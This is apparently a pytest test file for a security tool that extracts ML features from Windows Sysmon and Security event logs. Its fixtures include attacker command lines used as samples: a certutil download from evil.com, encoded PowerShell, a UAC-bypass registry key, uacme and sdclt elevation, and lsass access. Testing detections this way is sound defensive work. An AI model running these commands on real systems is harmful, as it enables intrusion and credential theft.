import pytest
from datetime import datetime
from app.schemas.event import NormalizedEvent
from app.ml.features import extract_features

def create_event(event_id, channel="Security", event_data=None, **kwargs):
    default_data = {
        "host": "TEST-HOST",
        "timestamp": datetime.now(),
        "event_id": event_id,
        "channel": channel,
        "event_record_id": 1,
        "raw": {}
    }
    default_data.update(kwargs)
    event_data = event_data or {}
    return NormalizedEvent(**default_data, event_data=event_data)

def test_extract_sysmon_features():
    # Mix of Sysmon process creation and network
    events = [
        create_event(1, channel="Microsoft-Windows-Sysmon/Operational", process="cmd.exe", parent_process="winword.exe", command_line="cmd.exe /c start"),
        create_event(3, channel="Microsoft-Windows-Sysmon/Operational", process="powershell.exe", destination_ip="8.8.8.8", destination_port=53)
    ]
    features = extract_features(events)
    assert features["process_count"] == 1
    assert features["lolbin_execution_count"] == 0
    assert features["parent_child_anomaly_count"] == 1
    assert features["network_event_count"] == 1
    assert features["suspicious_network_process_count"] == 1
    assert features["external_destination_count"] == 1

def test_extract_security_features():
    events = [
        create_event(4624, event_data={"LogonType": "3", "TargetUserName": "admin", "IpAddress": "192.168.1.100"}),
        create_event(4625, event_data={"LogonType": "3", "TargetUserName": "user", "IpAddress": "192.168.1.101"}),
        create_event(4672, event_data={"SubjectUserName": "admin"}),
        create_event(4720, event_data={"TargetUserName": "new_user"}),
        create_event(4662, event_data={"ObjectName": "CN=AdminSDHolder"}),
        create_event(1102, event_data={})
    ]
    features = extract_features(events)
    assert features["successful_logon_count"] == 1
    assert features["failed_logon_count"] == 1
    assert features["remote_logon_count"] == 2
    assert features["admin_logon_count"] == 1
    assert features["unique_logon_users"] == 2
    assert features["special_privilege_logon_count"] == 1
    assert features["account_created_count"] == 1
    assert features["directory_service_access_count"] == 1
    assert features["security_log_cleared_count"] == 1
    assert features["authentication_failure_ratio"] == 0.5
    assert features["security_event_ratio"] > 0
    assert features["total_events"] == 6

def test_empty_evtx():
    events = []
    features = extract_features(events)
    assert features["total_events"] == 0
    assert features["authentication_failure_ratio"] == 0.0

def test_unknown_event_ids():
    events = [
        create_event(9999, channel="Custom", event_data={"SomeField": "Value"}),
        create_event(8888, channel="Custom")
    ]
    features = extract_features(events)
    assert features["total_events"] == 2
    assert features["unique_event_ids"] == 2
    assert features["process_count"] == 0
    assert features["successful_logon_count"] == 0

def test_missing_xml_fields():
    # Events with no event_data or missing fields
    events = [
        create_event(4624, event_data=None),
        create_event(4624, event_data={"TargetUserName": None, "IpAddress": None})
    ]
    features = extract_features(events)
    assert features["successful_logon_count"] == 2
    assert features["unique_logon_users"] == 0
    assert features["unique_source_ips"] == 0

def test_malformed_unexpected_events():
    events = [
        create_event(4624, event_data={"LogonType": "unexpected_list"}),
        create_event(4656, event_data={"ObjectName": "12345"}),
        create_event(3, event_data={"DestinationPort": "not-an-int"})
    ]
    features = extract_features(events)
    assert features["total_events"] == 3

def test_heuristic_advanced_features():
    # Mix of basic and advanced heuristics
    events = [
        # Basic heuristic matches
        create_event(7045, event_data={"ImagePath": "cmd.exe /c payload.exe"}), # Service creation + Suspicious service imagepath
        create_event(1102, event_data={}), # Log cleared
        create_event(10, event_data={"TargetImage": "C:\\Windows\\system32\\lsass.exe"}), # lsass access
        
        # LOLBins / PS
        create_event(1, command_line="certutil.exe -urlcache -split -f http://evil.com/a a.exe"), # lolbin usage
        create_event(1, command_line="powershell.exe -enc ZQBjAGgAbwAgAGgAYQBjAGsAZQBkAA=="), # suspicious PS
        
        # Remote Named Pipe / Admin Share
        create_event(18, event_data={"PipeName": "\\lsarpc"}), # remote named pipe
        create_event(5145, event_data={"ShareName": "\\\\*\\IPC$"}), # admin share access
        
        # Advanced Heuristic matches
        create_event(1, command_line="uacme.exe 23"), # exploit tool
        create_event(13, event_data={"TargetObject": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"}), # uac bypass
        create_event(1, command_line="whoami", event_data={"ParentImage": "wsmprovhost.exe"}), # winrm spawned recon
        create_event(1, command_line="cmd.exe /c osk.exe", event_data={"Image": "osk.exe", "ParentImage": "cmd.exe"}), # accessibility hijack
        create_event(1, command_line="sdclt.exe /kickoffelev"), # advanced lolbin
        create_event(18456, event_data={}), # db failed logon
        create_event(4798, event_data={"TargetUserName": "Administrators"}), # domain enumeration
        create_event(4738, event_data={}) # account tampering
    ]
    features = extract_features(events)
    
    # 8 Basic
    assert features["service_creation"] == 1
    assert features["log_cleared"] == 1
    assert features["lsass_access"] == 1
    assert features["lolbin_usage"] == 1
    assert features["suspicious_powershell"] == 1
    assert features["remote_named_pipe"] == 1
    assert features["admin_share_access"] == 1
    
    # 9 Advanced
    assert features["exploit_tool_regex_match"] == 1
    assert features["uac_bypass_registry_count"] == 1
    assert features["winrm_spawned_recon_count"] == 1
    assert features["suspicious_service_imagepath_count"] == 1
    assert features["accessibility_hijack_count"] == 2
    assert features["advanced_lolbin_count"] == 1
    assert features["db_failed_logon_count"] == 1
    assert features["domain_enumeration_count"] == 1
    assert features["account_tampering_count"] == 1
    
    # Test dictionary output length is correctly appended
    assert len(features) == 70

